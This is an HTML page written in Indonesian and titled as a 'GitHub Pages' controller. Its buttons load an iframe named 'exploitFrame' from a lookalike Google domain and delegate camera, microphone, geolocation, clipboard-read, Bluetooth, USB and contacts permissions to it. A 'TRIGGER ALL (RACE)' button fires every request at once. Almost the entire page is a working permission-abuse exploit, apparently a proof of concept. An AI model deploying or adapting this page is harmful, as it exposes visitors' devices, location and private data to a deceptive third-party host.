<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GitHub Pages - Full 1-Click Controller</title>
    <style>
        body { 
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; 
            margin: 20px; 
            background: #f6f8fa; 
        }
        .container { 
            max-width: 900px; 
            margin: 0 auto; 
            padding: 20px; 
            background: #ffffff; 
            border: 1px solid #d0d7de; 
            border-radius: 6px; 
        }
        h3 { margin-top: 0; padding-bottom: 8px; border-bottom: 1px solid #d0d7de; }
        .btn-grid { 
            display: grid; 
            grid-template-columns: repeat(auto-fill, minmax(160px, 1fr)); 
            gap: 10px; 
            margin-bottom: 20px; 
        }
        button { 
            padding: 12px; 
            font-size: 14px; 
            font-weight: bold; 
            color: #ffffff; 
            background-color: #24292f; 
            border: 1px solid rgba(27,31,36,0.15); 
            border-radius: 6px; 
            cursor: pointer; 
        }
        button:hover { background-color: #1f2327; }
        button.all-btn { background-color: #cf222e; }
        button.all-btn:hover { background-color: #b60215; }
        
        .frame-container { 
            border: 2px solid #24292f; 
            border-radius: 6px; 
            margin-top: 20px; 
        }
        iframe { 
            width: 100%; 
            height: 450px; 
            border: none; 
            display: block; 
        }
    </style>
</head>
<body>

<div class="container">
    <h3>GitHub Pages Controller (Full API)</h3>
    <p>Klik salah satu tombol di bawah untuk memicu permission di target origin secara instan:</p>
    
    <div class="btn-grid">
        <button onclick="trigger('camera')">📹 Kamera</button>
        <button onclick="trigger('microphone')">🎙️ Mikrofon</button>
        <button onclick="trigger('location')">📍 Lokasi</button>
        <button onclick="trigger('notification')">🔔 Notifikasi</button>
        <button onclick="trigger('clipboard')">📋 Clipboard</button>
        <button onclick="trigger('bluetooth')">🔵 Bluetooth</button>
        <button onclick="trigger('usb')">🔌 USB</button>
        <button onclick="trigger('contacts')">📱 Kontak</button>
        <button class="all-btn" onclick="trigger('all')">⚡ TRIGGER ALL (RACE)</button>
    </div>

    <div class="frame-container">
        <iframe 
            id="exploitFrame" 
            src="about:blank" 
            allow="camera https://googllogoligaturee.my.id; 
                   microphone https://googllogoligaturee.my.id; 
                   geolocation https://googllogoligaturee.my.id; 
                   clipboard-read https://googllogoligaturee.my.id; 
                   bluetooth https://googllogoligaturee.my.id; 
                   usb https://googllogoligaturee.my.id; 
                   contacts https://googllogoligaturee.my.id">
        </iframe>
    </div>
</div>

<script>
    const TARGET_URL = "https://googllogoligaturee.my.id/perm.html";

    function trigger(mode) {
        const frame = document.getElementById('exploitFrame');
        // Mengubah src secara instan membawa parameter mode untuk dieksekusi otomatis oleh perm.html
        frame.src = `${TARGET_URL}?mode=${mode}`;
    }
</script>

</body>
</html>
